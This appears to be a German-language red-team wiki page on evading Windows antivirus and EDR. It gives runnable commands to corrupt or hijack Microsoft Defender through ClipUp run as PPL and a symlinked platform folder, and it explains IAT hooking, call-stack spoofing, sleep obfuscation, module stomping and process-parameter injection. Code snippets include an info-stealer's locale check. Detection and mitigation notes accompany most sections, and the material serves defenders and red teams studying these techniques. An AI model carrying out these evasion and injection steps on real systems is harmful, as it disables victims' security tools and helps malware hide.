- Open-Source-Hilfsprogramm: CreateProcessAsPPL (wählt das Protection Level aus und leitet Argumente an die Ziel-EXE weiter):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Verwendungsmuster:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Die signierte System-Binary `C:\Windows\System32\ClipUp.exe` startet sich selbst und akzeptiert einen Parameter, um eine Logdatei an einen vom Aufrufer angegebenen Pfad zu schreiben.
- Wenn sie als PPL-Prozess gestartet wird, erfolgt der Dateischreibvorgang mit PPL-Unterstützung.
- ClipUp kann keine Pfade mit Leerzeichen verarbeiten; verwenden Sie 8.3-Kurzpfade, um auf normalerweise geschützte Speicherorte zu verweisen.

8.3-Kurzpfad-Hilfsfunktionen
- Kurznamen auflisten: `dir /x` in jedem übergeordneten Verzeichnis.
- Kurzpfad in cmd ableiten: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Missbrauchskette (abstrakt)
1) Starten Sie das PPL-fähige LOLBIN (ClipUp) mit `CREATE_PROTECTED_PROCESS` unter Verwendung eines Launchers (z. B. CreateProcessAsPPL).
2) Übergeben Sie das ClipUp-Argument für den Logpfad, um die Erstellung einer Datei in einem geschützten AV-Verzeichnis (z. B. Defender Platform) zu erzwingen. Verwenden Sie bei Bedarf 8.3-Kurznamen.
3) Wenn die Zieldatei normalerweise während des Betriebs vom AV geöffnet/gesperrt wird (z. B. MsMpEng.exe), planen Sie den Schreibvorgang beim Booten, bevor der AV startet, indem Sie einen Auto-Start-Service installieren, der zuverlässig früher ausgeführt wird. Validieren Sie die Boot-Reihenfolge mit Process Monitor (Boot-Logging).
4) Beim Neustart erfolgt der PPL-gestützte Schreibvorgang, bevor der AV seine Binaries sperrt, wodurch die Zieldatei beschädigt und der Start verhindert wird.

Beispielaufruf (Pfade aus Sicherheitsgründen entfernt/gekürzt):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Hinweise und Einschränkungen
- Du kannst den Inhalt, den ClipUp schreibt, nicht kontrollieren; die Primitive eignet sich eher für Korruption als für die präzise Injektion von Inhalten.
- Lokale Administratorrechte/SYSTEM sind erforderlich, um einen Dienst zu installieren/zu starten, sowie ein Neustartfenster.
- Das Timing ist kritisch: Das Ziel darf nicht geöffnet sein; die Ausführung beim Booten vermeidet Dateisperren.

Erkennungen
- Prozesserstellung von `ClipUp.exe` mit ungewöhnlichen Argumenten, insbesondere wenn der übergeordnete Prozess ein nicht standardmäßiger Launcher ist, rund um den Bootvorgang.
- Neue Dienste, die so konfiguriert sind, dass sie verdächtige Binaries automatisch starten, und die nachweislich vor Defender/AV starten. Untersuchung der Dienst-Erstellung/-Änderung vor Fehlern beim Start von Defender.
- Überwachung der Dateiintegrität von Defender-Binaries/Platform-Verzeichnissen; unerwartete Datei-Erstellungen/-Änderungen durch Prozesse mit Protected-Process-Flags.
- ETW/EDR-Telemetrie: Suche nach Prozessen, die mit `CREATE_PROTECTED_PROCESS` erstellt wurden, sowie nach anomaler Verwendung von PPL-Levels durch Nicht-AV-Binaries.

Abhilfemaßnahmen
- WDAC/Code Integrity: Einschränken, welche signierten Binaries als PPL ausgeführt werden dürfen und unter welchen übergeordneten Prozessen; Aufrufe von ClipUp außerhalb legitimer Kontexte blockieren.
- Diensthygiene: Erstellung/Änderung von automatisch startenden Diensten einschränken und Manipulationen der Startreihenfolge überwachen.
- Sicherstellen, dass der Tamper Protection von Defender und der Early-Launch-Schutz aktiviert sind; Startfehler untersuchen, die auf eine Beschädigung von Binaries hindeuten.
- Das Deaktivieren der 8.3-Kurznamen-Erstellung auf Volumes, auf denen Security-Tools gespeichert sind, in Betracht ziehen, sofern dies mit deiner Umgebung kompatibel ist (gründlich testen).

## Microsoft Defender durch Hijacking eines Symlinks auf den Platform-Version-Ordner manipulieren

Windows Defender wählt die Platform, von der es ausgeführt wird, indem es Unterordner unter folgendem Pfad aufzählt:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Es wählt den Unterordner mit dem höchsten lexikografischen Versionsstring (z. B. `4.18.25070.5-0`) aus und startet anschließend die Defender-Dienstprozesse von dort (wobei die Pfade des Dienstes/der Registry entsprechend aktualisiert werden). Diese Auswahl vertraut Verzeichniseinträgen einschließlich Verzeichnis-Reparse-Points (Symlinks). Ein Administrator kann dies nutzen, um Defender auf einen vom Angreifer beschreibbaren Pfad umzuleiten und DLL-Sideloading oder eine Störung des Dienstes zu erreichen.<sup>[[21]](#references)[[22]](#references)</sup>

Voraussetzungen
- Lokaler Administrator (erforderlich, um Verzeichnisse/Symlinks unter dem Platform-Ordner zu erstellen)
- Möglichkeit, einen Neustart auszuführen oder eine erneute Auswahl der Defender-Platform auszulösen (Dienstneustart beim Booten)
- Nur integrierte Tools erforderlich (`mklink`)

Warum es funktioniert
- Defender blockiert Schreibvorgänge in seinen eigenen Ordnern, aber die Auswahl der Platform vertraut Verzeichniseinträgen und wählt die lexikografisch höchste Version aus, ohne zu überprüfen, ob das Ziel auf einen geschützten/vertrauenswürdigen Pfad aufgelöst wird.

Schritt für Schritt (Beispiel)
1) Einen beschreibbaren Klon des aktuellen Platform-Ordners vorbereiten, z. B. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Erstelle innerhalb von Platform einen Verzeichnis-Symlink mit einer höheren Versionsnummer, der auf deinen Ordner zeigt:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Auswahl des Triggers (Neustart empfohlen):
```cmd
shutdown /r /t 0
```
4) Überprüfe, dass MsMpEng.exe (WinDefend) vom umgeleiteten Pfad ausgeführt wird:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Du solltest den neuen Prozesspfad unter `C:\TMP\AV\` sowie die Dienstkonfiguration/Registry beobachten, die diesen Speicherort widerspiegelt.

Optionen nach der Exploitation
- DLL sideloading/code execution: DLLs, die Defender aus seinem Anwendungsverzeichnis lädt, ablegen/ersetzen, um Code in den Prozessen von Defender auszuführen. Siehe den obigen Abschnitt: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Den Versions-Symlink entfernen, sodass der konfigurierte Pfad beim nächsten Start nicht aufgelöst werden kann und Defender den Start abbricht:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Beachten Sie, dass diese Technik allein keine Privilege Escalation ermöglicht; sie erfordert Administratorrechte.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red Teams können Runtime-Evasion aus dem C2-Implantat in das Zielmodul selbst verlagern, indem sie dessen Import Address Table (IAT) hooken und ausgewählte APIs über angreiferkontrollierten, positionsunabhängigen Code (PIC) routen. Dies erweitert Evasion über die kleine API-Oberfläche hinaus, die viele Kits bereitstellen (z. B. CreateProcessA), und überträgt denselben Schutz auf BOFs und Post-Exploitation-DLLs.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

High-Level-Ansatz
- Einen PIC-Blob mithilfe eines Reflective Loaders neben dem Zielmodul platzieren (vorangestellt oder als Companion). Der PIC muss in sich geschlossen und positionsunabhängig sein.
- Während die Host-DLL geladen wird, ihren IMAGE_IMPORT_DESCRIPTOR durchlaufen und die IAT-Einträge für gezielte Imports (z. B. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) patchen, sodass sie auf schlanke PIC-Wrapper zeigen.
- Jeder PIC-Wrapper führt vor dem Tail-Call zur echten API-Adresse Evasions aus. Typische Evasions umfassen:
- Memory Masking/Unmasking rund um den Aufruf (z. B. Beacon-Regionen verschlüsseln, RWX→RX, Seitennamen/-berechtigungen ändern) und anschließendes Wiederherstellen nach dem Aufruf.
- Call-Stack Spoofing: Einen harmlosen Stack erstellen und in die Ziel-API wechseln, sodass die Call-Stack-Analyse erwartete Frames auflöst.<sup>[[9]](#references)</sup>
- Für die Kompatibilität eine Schnittstelle exportieren, über die ein Aggressor-Script (oder Äquivalent) registrieren kann, welche APIs für Beacon, BOFs und Post-Ex-DLLs gehookt werden sollen.

Warum hier IAT Hooking
- Funktioniert für jeden Code, der den gehookten Import verwendet, ohne den Tool-Code zu ändern oder sich darauf zu verlassen, dass Beacon bestimmte APIs proxyt.
- Deckt Post-Ex-DLLs ab: Durch das Hooken von LoadLibrary* können Sie das Laden von Modulen (z. B. System.Management.Automation.dll, clr.dll) abfangen und dasselbe Masking sowie dieselbe Stack-Evasion auf deren API-Aufrufe anwenden.
- Stellt die zuverlässige Verwendung von Post-Ex-Befehlen zum Starten von Prozessen gegenüber Call-Stack-basierten Detections wieder her, indem CreateProcessA/W gewrappt wird.

Minimaler IAT-Hook-Entwurf (x64-C/C++-Pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Hinweise
- Wende den Patch nach Relocations/ASLR und vor der ersten Verwendung des Imports an. Reflective loaders wie TitanLdr/AceLdr demonstrieren Hooking während `DllMain` des geladenen Moduls.
- Halte Wrappers klein und PIC-sicher; löse die echte API über den ursprünglichen IAT-Wert auf, den du vor dem Patching erfasst hast, oder über `LdrGetProcedureAddress`.
- Verwende für PIC RW → RX-Übergänge und hinterlasse keine beschreibbaren und ausführbaren Seiten.

Call-stack spoofing stub
- Draugr-artige PIC-stubs erstellen eine gefälschte Aufrufkette (Rücksprungadressen in benignen Modulen) und wechseln anschließend zur echten API.
- Damit werden Erkennungen umgangen, die kanonische Stacks von Beacon/BOFs zu sensiblen APIs erwarten.
- Kombiniere dies mit Stack-cutting/Stack-stitching-Techniken, um vor dem API-Prolog innerhalb der erwarteten Frames zu landen.

Operative Integration
- Stelle den reflective loader den post-ex DLLs voran, damit PIC und Hooks beim Laden der DLL automatisch initialisiert werden.
- Verwende ein Aggressor-Script, um Ziel-APIs zu registrieren, sodass Beacon und BOFs ohne Codeänderungen transparent vom gleichen Evasion-Pfad profitieren.

Erkennungs-/DFIR-Aspekte
- IAT-Integrität: Einträge, die auf Nicht-Image-Adressen (Heap/anonym) zeigen; regelmäßige Überprüfung von Import-Pointern.
- Stack-Anomalien: Rücksprungadressen, die zu keinem geladenen Image gehören; abrupte Übergänge zu Nicht-Image-PIC; inkonsistente `RtlUserThreadStart`-Abstammung.
- Loader-Telemetrie: In-Process-Schreibvorgänge in die IAT, frühe `DllMain`-Aktivität, die Import-Thunks verändert, unerwartete RX-Regionen, die beim Laden erstellt werden.
- Image-Load-Evasion: Wenn `LoadLibrary*` gehookt wird, verdächtige Loads von Automation-/clr-Assemblies überwachen, die mit Memory-Masking-Ereignissen korrelieren.

Verwandte Bausteine und Beispiele
- Reflective loader, die während des Ladens IAT-Patching durchführen (z. B. TitanLdr, AceLdr)
- Memory-Masking-Hooks (z. B. simplehook) und Stack-cutting-PIC (stackcutting)
- PIC-Call-stack-spoofing-stubs (z. B. Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks über ein resident PICO

Wenn du einen reflective loader kontrollierst, kannst du Imports während `ProcessImports()` hooken, indem du den `GetProcAddress`-Pointer des Loaders durch einen benutzerdefinierten Resolver ersetzt, der zuerst nach Hooks sucht:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Erstelle ein **resident PICO** (persistentes PIC-Objekt), das bestehen bleibt, nachdem der transiente Loader-PIC sich selbst freigegeben hat.
- Exportiere eine Funktion `setup_hooks()`, die den Import-Resolver des Loaders überschreibt (z. B. `funcs.GetProcAddress = _GetProcAddress`).
- Überspringe in `_GetProcAddress` Ordinal-Imports und verwende eine hashbasierte Hook-Suche wie `__resolve_hook(ror13hash(name))`. Wenn ein Hook existiert, gib ihn zurück; andernfalls delegiere an den echten `GetProcAddress`.
- Registriere Hook-Ziele zur Link-Zeit mit Crystal-Palace-Einträgen `addhook "MODULE$Func" "hook"`. Der Hook bleibt gültig, weil er innerhalb des resident PICO liegt.

Dies ermöglicht **Import-time-IAT-Redirection**, ohne nach dem Laden den Codeabschnitt der geladenen DLL zu patchen.

### Hookbare Imports erzwingen, wenn das Ziel PEB-walking verwendet

Import-time-Hooks werden nur ausgelöst, wenn sich die Funktion tatsächlich in der IAT des Ziels befindet. Wenn ein Modul APIs über einen PEB-walk + Hash auflöst (ohne Import-Eintrag), erzwinge einen echten Import, damit der `ProcessImports()`-Pfad des Loaders ihn sieht:

- Ersetze die gehashte Export-Auflösung (z. B. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) durch eine direkte Referenz wie `&WaitForSingleObject`.
- Der Compiler erzeugt einen IAT-Eintrag, wodurch eine Interception möglich wird, wenn der reflective loader die Imports auflöst.

### Ekko-artige Sleep-/Idle-Obfuscation ohne Patching von `Sleep()`

Statt `Sleep` zu patchen, hooke die **tatsächlich vom Implant verwendeten Wait-/IPC-Primitiven** (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Wickle bei langen Wartezeiten den Aufruf in eine Ekko-artige Obfuscation-Kette ein, die das In-Memory-Image während des Idlezustands verschlüsselt:<sup>[[31]](#references)[[27]](#references)</sup>

- Verwende `CreateTimerQueueTimer`, um eine Folge von Callbacks zu planen, die `NtContinue` mit erzeugten `CONTEXT`-Frames aufrufen.
- Typische Kette (x64): Image auf `PAGE_READWRITE` setzen → RC4-Verschlüsselung über das vollständige gemappte Image mittels `advapi32!SystemFunction032` → blockierenden Wait ausführen → RC4-Entschlüsselung → **Berechtigungen pro Section wiederherstellen**, indem PE-Sections durchlaufen werden → Abschluss signalisieren.
- `RtlCaptureContext` liefert ein Template-`CONTEXT`; klone es in mehrere Frames und setze Register (`Rip/Rcx/Rdx/R8/R9`), um jeden Schritt aufzurufen.

Operatives Detail: Gib bei langen Wartezeiten „success“ zurück (z. B. `WAIT_OBJECT_0`), damit der Aufrufer fortfährt, während das Image maskiert ist. Dieses Muster verbirgt das Modul während Idle-Fenstern vor Scannern und vermeidet die klassische Signatur eines „gepatchten `Sleep()`“.

Erkennungsideen (telemetriebasiert)
- Bursts von `CreateTimerQueueTimer`-Callbacks, die auf `NtContinue` zeigen.
- `advapi32!SystemFunction032`, das auf großen zusammenhängenden, imagegroßen Buffern verwendet wird.
- Große `VirtualProtect`-Bereiche, gefolgt von einer benutzerdefinierten Wiederherstellung der Berechtigungen pro Section.

### Laufzeit-CFG-Registrierung für Sleep-Obfuscation-Gadgets

Bei CFG-aktivierten Zielen führt der erste indirekte Sprung zu einem Mid-Function-Gadget wie `jmp [rbx]` oder `jmp rdi` normalerweise zum Absturz des Prozesses mit `STATUS_STACK_BUFFER_OVERRUN`, weil das Gadget nicht in den CFG-Metadaten des Moduls vorhanden ist. Damit Ekko-/Kraken-artige Ketten innerhalb gehärteter Prozesse aktiv bleiben:<sup>[[30]](#references)</sup>

- Registriere jedes von der Kette verwendete indirekte Ziel mit `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` und `CFG_CALL_TARGET_VALID`-Einträgen.
- Bei Adressen innerhalb geladener Images (`ntdll`, `kernel32`, `advapi32`) muss der `MEMORY_RANGE_ENTRY` an der **Image-Basis** beginnen und die **vollständige Image-Größe** abdecken.
- Verwende bei manuell gemappten/PIC-/gestompten Regionen stattdessen die **Allocation-Basis** und die Größe der Allocation.
- Markiere nicht nur das Dispatch-Gadget, sondern auch indirekt erreichte Exports (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, Wait-/Event-Syscalls) sowie alle kontrollierten ausführbaren Sections des Angreifers, die zu indirekten Zielen werden.

Damit werden ROP-/JOP-artige Sleep-Ketten von einem „funktioniert nur in Nicht-CFG-Prozessen“-Ansatz zu einem wiederverwendbaren Primitive für `explorer.exe`, Browser, `svchost.exe` und andere mit `/guard:cf` kompilierten Endpunkte.

### CET-sicheres Stack-Spoofing für schlafende Threads

Ein vollständiger `CONTEXT`-Ersatz ist auffällig und kann auf CET-Shadow-Stack-Systemen fehlschlagen, weil ein gefälschtes `Rip` weiterhin mit dem Hardware-Shadow-Stack übereinstimmen muss. Ein sichereres Sleep-Masking-Muster ist:<sup>[[30]](#references)</sup>

- Wähle einen anderen Thread im selben Prozess und lies dessen `NT_TIB`-/TEB-Stack-Grenzen (`StackBase`, `StackLimit`) über `NtQueryInformationThread` aus.
- Sichere den echten TEB/TIB des aktuellen Threads.
- Erfasse den echten Schlafkontext mit `GetThreadContext`.
- Kopiere **nur das echte `Rip`** in den Spoof-Kontext und lasse das gespoofte `Rsp`/den Stack-Zustand unverändert.
- Kopiere während des Sleep-Fensters den `NT_TIB` des Spoof-Threads in den aktuellen TEB, damit Stack-Walker innerhalb eines legitimen Stack-Bereichs auflösen.
- Stelle nach Abschluss des Waits den ursprünglichen TIB und Thread-Kontext wieder her.

Dies bewahrt einen CET-konsistenten Instruction Pointer und führt gleichzeitig EDR-Stack-Walker in die Irre, die TEB-Stack-Metadaten zur Validierung von Unwinds verwenden.

### APC-basierte Alternative: Kraken Mask

Wenn Timer-Queue-Dispatch zu signaturbehaftet ist, kann dieselbe Sleep-Encrypt-Spoof-Restore-Sequenz aus einem suspendierten Helper-Thread mittels gequeue-ter APCs ausgeführt werden:<sup>[[27]](#references)</sup>

- Erstelle einen Helper-Thread mit `NtTestAlert` als Entrypoint.
- Queue vorbereitete `CONTEXT`-Frames/APCs mit `NtQueueApcThread` und arbeite sie mit `NtAlertResumeThread` ab.
- Speichere den Kettenzustand auf dem Heap statt auf dem Helper-Stack, um eine Erschöpfung des standardmäßigen 64-KB-Thread-Stacks zu vermeiden.
- Verwende `NtSignalAndWaitForSingleObject`, um das Start-Event atomar zu signalisieren und zu blockieren.
- Suspendiere den Main-Thread vor der Wiederherstellung von TIB/Kontext (`NtSuspendThread` → restore → `NtResumeThread`), um das Zeitfenster zu verkleinern, in dem ein Scanner einen teilweise wiederhergestellten Stack erfassen könnte.

Damit wird die Signatur `CreateTimerQueueTimer` + `NtContinue` gegen eine Helper-Thread-/APC-Signatur ausgetauscht, während dieselben Ziele für RC4-Masking und Stack-Spoofing erhalten bleiben.

Zusätzliche Erkennungsideen
- `NtSetInformationVirtualMemory` mit `VmCfgCallTargetInformation` kurz vor Sleeps, Waits oder APC-Dispatch.
- `GetThreadContext`/`SetThreadContext` im Zusammenhang mit `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` oder `ConnectNamedPipe`.
- `NtQueryInformationThread`, gefolgt von direkten Schreibvorgängen in die TEB/TIB-Stack-Grenzen des aktuellen Threads.
- `NtQueueApcThread`-/`NtAlertResumeThread`-Ketten, die indirekt `SystemFunction032`, `VirtualProtect` oder Hilfsfunktionen zur Wiederherstellung von Section-Berechtigungen erreichen.
- Wiederholte Verwendung kurzer Gadget-Signaturen wie `FF 23` (`jmp [rbx]`) oder `FF E7` (`jmp rdi`) als Dispatch-Pivots innerhalb signierter Module.


## Precision Module Stomping

Module Stomping führt Payloads aus dem **`.text`-Abschnitt einer DLL aus, die bereits innerhalb des Zielprozesses gemappt ist**, statt auffälligen privaten ausführbaren Speicher zu allokieren oder eine neue sacrificial DLL zu laden. Das Überschreibziel sollte ein **geladenes, diskbasiertes Image** sein, dessen Codebereich die Payload aufnehmen kann, ohne noch benötigte Codepfade des Prozesses zu beschädigen.<sup>[[1]](#references)[[2]](#references)</sup>

### Zuverlässige Zielauswahl

Naives Stomping gegen verbreitete Module wie `uxtheme.dll` oder `comctl32.dll` ist fragil: Die DLL ist im Remote-Prozess möglicherweise nicht geladen, und ein zu kleiner Codebereich führt zum Absturz des Prozesses. Ein zuverlässigerer Ablauf ist:

1. Enumeriere die Module des Zielprozesses und behalte eine **namenbasierte Include-Liste** der bereits geladenen DLLs.
2. Erstelle zuerst die Payload und erfasse ihre **exakte Byte-Größe**.
3. Scanne die Kandidaten-DLLs auf der Festplatte und vergleiche `Misc_VirtualSize` der PE-Section **`.text`** mit der Payload-Größe. Das ist wichtiger als die Dateigröße, weil dieser Wert die Größe des ausführbaren Abschnitts **beim Mapping in den Speicher** widerspiegelt.
4. Parse die **Export Address Table (EAT)** und wähle die RVA einer exportierten Funktion als Start-Offset für das Stomping.
5. Berechne den **Blast Radius**: Wenn die Payload die Grenze der ausgewählten Funktion überschreitet, überschreibt sie benachbarte Exports, die danach im Speicher angeordnet sind.

Typische Recon-/Auswahl-Hilfsfunktionen, die in freier Wildbahn zu sehen sind:
```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```
Operational notes
- Bevorzuge DLLs, die im Remote-Prozess **bereits geladen** sind, um die Telemetrie von `LoadLibrary`/unerwarteten Image-Loads zu vermeiden.
- Bevorzuge Exports, die von der Zielanwendung nur selten ausgeführt werden, da normale Codepfade andernfalls die manipulierten Bytes vor oder nach der Thread-Erstellung ausführen könnten.
- Große Implants erfordern häufig, die Shellcode-Einbettung von einem String-Literal in einen **Byte-Array/Braced-Initializer** zu ändern, damit der vollständige Buffer im Injector-Quellcode korrekt dargestellt wird.

Detection ideas
- Remote-Schreibvorgänge in **image-backed executable pages** (`MEM_IMAGE`, `PAGE_EXECUTE*`) statt in die häufigeren privaten RWX/RX-Allokationen.
- Export-Einstiegspunkte, deren In-Memory-Bytes nicht mehr mit der zugrunde liegenden Datei auf der Festplatte übereinstimmen.
- Remote-Threads oder Context-Pivots, die ihre Ausführung innerhalb eines legitimen DLL-Exports beginnen, dessen erste Bytes kürzlich verändert wurden.
- Verdächtige Sequenzen aus `VirtualProtect(Ex)` / `WriteProcessMemory` gegen DLL-`.text`-Seiten, gefolgt von der Thread-Erstellung.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) ist eine **process-injection / EDR-evasion**-Technik, die den klassischen Remote-Write-Pfad (`VirtualAllocEx` + `WriteProcessMemory`) vermeidet. Statt Bytes in ein bereits laufendes Ziel zu kopieren, nutzt sie die Tatsache aus, dass Windows ausgewählte `CreateProcessW`-Startparameter in den Child-Prozess **kopiert** und innerhalb von `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`) speichert.<sup>[[28]](#references)[[29]](#references)</sup>

### Poisonable carriers copied by `CreateProcessW`

Nützliche Carrier sind:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (mit `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Praktische Einschränkungen der Carrier:

- `lpCommandLine` muss für `CreateProcessW` auf beschreibbaren Speicher zeigen und ist auf **32.767 Unicode-Zeichen** einschließlich des Nullterminators begrenzt.
- `lpEnvironment` muss ein Unicode-Environment-Block aus aufeinanderfolgenden `NAME=VALUE\0`-Strings sein, der mit einem zusätzlichen `\0` endet.
- `lpReserved` ist offiziell reserviert. Daher sollte das `ShellInfo`-Mapping eher als Implementierungsdetail und nicht als stabiler dokumentierter Vertrag betrachtet werden.

Dadurch wird die normale Prozesserstellung zum **Payload-Transfer-Primitiv**. Der Operator erstellt den Child-Prozess mit vom Angreifer kontrollierten Startdaten und überlässt Windows das Cross-Process-Kopieren.

### Remote lookup flow without remote write APIs

Nachdem der Child-Prozess erstellt wurde, wird der kopierte Buffer mithilfe von **read-only**-Primitiven aufgelöst:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → `PROCESS_BASIC_INFORMATION.PebBaseAddress` abrufen
2. Die Remote-`PEB` lesen
3. `PEB.ProcessParameters` verfolgen
4. `RTL_USER_PROCESS_PARAMETERS` lesen
5. Den ausgewählten Pointer verwenden:
- `parameters.CommandLine.Buffer`
- `parameters.Environment`
- `parameters.ShellInfo.Buffer`

Minimaler Ablauf:
```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```
### Ausführen des kopierten Parameterpuffers

Die kopierte Parameterregion ist normalerweise `RW` und nicht ausführbar. Eine häufige P3-Kette ist:

1. Den Prozess normal erstellen (nicht suspendiert)
2. Die ausgewählte Parameterseite mit `NtProtectVirtualMemory` / `VirtualProtectEx` ausführbar machen
3. Das bereits in `PROCESS_INFORMATION` zurückgegebene Handle des Hauptthreads wiederverwenden
4. Die Ausführung mit `NtSetContextThread` (`CONTEXT_CONTROL`, `RIP` überschreiben) umleiten

Im Gegensatz zu klassischen Thread-Hijacking-Workflows erfordert dies **nicht `SuspendThread` / `ResumeThread`**; der Context kann direkt über das zurückgegebene Handle des Hauptthreads geändert werden.

Dadurch werden mehrere APIs vermieden, die häufig auf Injection überwacht werden:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- häufig auch `SuspendThread` / `ResumeThread`

### Einschränkung durch Nullbytes und staged shellcode

Alle drei Träger enthalten **String- oder stringähnliche Daten**, daher wird ein Raw-Payload mit `0x00` während der Übertragung abgeschnitten. Eine praktische Umgehung ist eine **null-free first stage**, die Konstanten zur Laufzeit rekonstruiert und anschließend eine beliebige second stage lädt.

Ein einfaches Muster ist die XOR-basierte Synthese von Konstanten:
```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```
Damit kann die first stage Stack-Strings, API-Argumente, DLL-Pfade oder einen second-stage shellcode loader erstellen, ohne Null-Bytes in den übertragenen Parameter einzubetten.

### Stack-based API calls from the first stage

Wenn die first stage APIs wie `LoadLibraryA` aufrufen muss, kann sie:

- den String/Buffer auf den Stack des Ziels pushen
- den **32-byte x64 shadow space** reservieren
- `RCX`, `RDX`, `R8`, `R9` auf Konstanten oder `RSP`-relative Pointer setzen
- `RSP` vor dem Aufruf **16-byte aligned** halten

Eine second stage kann anschließend vom Stack in eine `PAGE_READWRITE`-Allocation kopiert, mit `VirtualProtect` auf `PAGE_EXECUTE_READ` umgestellt und angesprungen werden, wodurch eine direkte RWX-Allocation vermieden wird.

### Detection ideas

Von den Autoren erwähnte gute Hunting-Möglichkeiten:

- `VirtualProtectEx` / `NtProtectVirtualMemory`, die **process-parameter pages executable** machen
- diese Schutzänderung gefolgt von `SetThreadContext` / `NtSetContextThread`
- Remote-Lesezugriffe auf `PEB` und anschließend auf `RTL_USER_PROCESS_PARAMETERS`
- ungewöhnlich lange / entropyreiche Werte in `lpCommandLine`, `lpEnvironment` oder `STARTUPINFO.lpReserved` während der Prozesserstellung

### Notes

- P3 ist ein **cross-process transfer trick** und für sich genommen keine vollständige Execution Primitive: Der kopierte Parameter benötigt weiterhin eine Änderung der Execute-Berechtigung und eine Methode zur Execution Redirection.
- `RtlCreateProcessReflection` / Dirty Vanity wurde von den Autoren in Betracht gezogen, aber abgelehnt, weil es intern verdächtige Primitives wie `NtWriteVirtualMemory` und `NtCreateThreadEx` verwendet.

## SantaStealer Tradecraft for Fileless Evasion and Credential Theft

SantaStealer (auch BluelineStealer genannt) veranschaulicht, wie moderne Info-Stealer AV bypass, Anti-analysis und Credential Access in einem einzigen Workflow kombinieren.<sup>[[24]](#references)</sup>

### Keyboard layout gating & sandbox delay

- Ein Config-Flag (`anti_cis`) zählt installierte Keyboard Layouts über `GetKeyboardLayoutList` auf. Wenn ein Cyrillic-Layout gefunden wird, legt das Sample einen leeren `CIS`-Marker ab und beendet sich vor dem Ausführen der Stealer. Dadurch wird sichergestellt, dass es in ausgeschlossenen Locales niemals detoniert, während ein Hunting-Artefakt zurückbleibt.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Verschachtelte `check_antivm`-Logik

- Variante A durchläuft die Prozessliste, hasht jeden Namen mit einer benutzerdefinierten Rolling-Checksumme und vergleicht sie mit eingebetteten Blocklists für Debugger/Sandboxes; anschließend wiederholt sie die Checksumme für den Computernamen und überprüft Arbeitsverzeichnisse wie `C:\analysis`.
